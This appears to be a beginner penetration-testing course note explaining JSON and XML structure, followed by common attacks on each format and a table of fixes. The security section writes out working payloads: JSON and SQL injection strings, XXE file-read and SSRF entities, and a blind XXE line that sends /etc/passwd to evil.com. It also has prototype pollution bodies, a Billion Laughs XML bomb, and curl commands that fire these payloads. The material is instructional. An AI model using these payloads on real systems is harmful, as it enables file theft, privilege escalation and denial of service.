---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.27 JSON and XML Structure"
---

# 02.27 — JSON and XML Structure

## What is it?

**JSON** (JavaScript Object Notation) and **XML** (Extensible Markup Language) are the two dominant data formats for web APIs and configuration. Understanding their structure is essential for parsing responses, crafting payloads, and exploiting injection vulnerabilities.

---

## JSON Structure

```json
{
  "string": "hello world",
  "number": 42,
  "float": 3.14,
  "boolean": true,
  "null_value": null,
  "array": [1, 2, 3, "mixed", true],
  "object": {
    "nested_key": "nested_value",
    "another": {
      "deep": "nesting"
    }
  },
  "array_of_objects": [
    {"id": 1, "name": "alice"},
    {"id": 2, "name": "bob"}
  ]
}
```

**JSON Data Types:**
```
string:  "hello"        ← always double quotes
number:  42, 3.14, -1
boolean: true, false    ← lowercase
null:    null           ← lowercase
array:   [1, 2, 3]     ← ordered list
object:  {"key":"val"} ← unordered key-value pairs
```

---

## XML Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- This is a comment -->
<root>
  <user id="123" role="admin">          <!-- attributes -->
    <username>alice</username>           <!-- text node -->
    <email>alice@test.com</email>
    <preferences>
      <theme>dark</theme>
      <notifications enabled="true"/>   <!-- self-closing tag -->
    </preferences>
    <data><![CDATA[Special chars: <>&" are safe here]]></data>  <!-- CDATA -->
  </user>
</root>

XML SPECIAL CHARACTERS (must be escaped outside CDATA):
  < → &lt;
  > → &gt;
  & → &amp;
  " → &quot;
  ' → &apos;
```

---

## XML Namespaces

```xml
<!-- Namespaces prevent name collisions -->
<root xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
      xmlns:tns="http://target.com/service">
  <soap:Header>...</soap:Header>
  <soap:Body>
    <tns:GetUser>
      <tns:id>123</tns:id>
    </tns:GetUser>
  </soap:Body>
</root>
```

---

## Security Context — JSON and XML in VAPT

### 1. JSON Injection

```
JSON INJECTION: Inserting data that breaks JSON structure.

VULNERABLE CODE (conceptual):
  response = '{"username":"' + username + '","role":"user"}'

ATTACK:
  username = alice","role":"admin","hack":"
  
  Result:
  {"username":"alice","role":"admin","hack":"","role":"user"}
  
  If app parses this → first "role":"admin" wins in some parsers!

ALSO: JSON in SQL queries:
  SELECT data FROM users WHERE json_data->>'name' = 'INJECTION';
  
  Try:
  username = alice' OR '1'='1
  → SQL injection through JSON column!
```

### 2. XML External Entities (XXE)

```xml
XXE ATTACK (full coverage in [[Module 14 - XXE]]):

<!-- Malicious XML with XXE payload: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <data>&xxe;</data>    <!-- file read! -->
  <data>&ssrf;</data>   <!-- SSRF! -->
</root>

BLIND XXE (data exfiltration via DNS/HTTP):
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % fetch "<!ENTITY exfil SYSTEM 'http://evil.com/?d=%data;'>">
```

### 3. JSON Path Traversal and Manipulation

```
JSON API with field selection:
  GET /api/user?fields=username,email

  Attack:
  GET /api/user?fields=username,email,password_hash
  → May return password hash if field selector not validated!

JSON key injection:
  POST /api/settings
  {"theme": "dark"}

  Attack:
  {"theme": "dark", "isAdmin": true, "role": "admin"}
  → Mass assignment via extra JSON keys
```

### 4. Prototype Pollution (JavaScript/Node.js)

```
JavaScript's prototype chain can be polluted via JSON:

ATTACK:
  POST /api/data
  {"__proto__": {"isAdmin": true}}

  If Node.js app uses Object.merge() or lodash.merge() without protection:
  Object.prototype.isAdmin = true
  → EVERY object in the app now has isAdmin: true!
  → if (user.isAdmin) → always true!

TEST:
  Send {"__proto__": {"polluted": "yes"}} in any JSON body
  Then check if {} (empty object) has polluted property

Also try:
  {"constructor": {"prototype": {"isAdmin": true}}}
```

### 5. XML Bomb (Billion Laughs DoS)

```xml
<!-- Billion Laughs Attack - causes DoS via exponential entity expansion -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>

lol9 expands to 10^9 "lol" strings → billions of bytes → memory exhaustion
```

---

## Hands-On: JSON and XML Analysis

```bash
# Pretty-print JSON response
curl -s https://target.com/api/user | python3 -m json.tool
curl -s https://target.com/api/user | jq .

# Extract specific JSON fields with jq
curl -s https://target.com/api/users | jq '.[].email'
curl -s https://target.com/api/user | jq '.id, .username, .role'

# Pretty-print XML
curl -s https://target.com/api/data | xmllint --format -

# Test JSON injection
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"username":"alice\",\"role\":\"admin\",\"x\":\"","email":"a@b.com"}'

# Test prototype pollution
curl -X POST https://target.com/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true},"setting":"value"}'

# Check response for admin access
curl https://target.com/api/admin -H "Cookie: session=YOUR_SESSION"

# XXE test in XML endpoint
curl -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| XXE in XML | Disable external entities and DTD processing |
| JSON injection | Use JSON serialization libraries, not string concatenation |
| Prototype pollution | Use Object.create(null) for merge operations, validate keys |
| XML Bomb DoS | Set entity expansion limits in XML parser |
| Mass assignment via JSON | Explicit allowlist of accepted JSON keys |

---

## Related Notes
- [[Module 14 - XXE]] — XXE full attack guide
- [[Module 01 - SQL Injection]] — SQL injection via JSON fields
- [[Module 06 - Mass Assignment]] — extra JSON key injection
- [[Module 27 - Prototype Pollution]] — JS-specific JSON attack
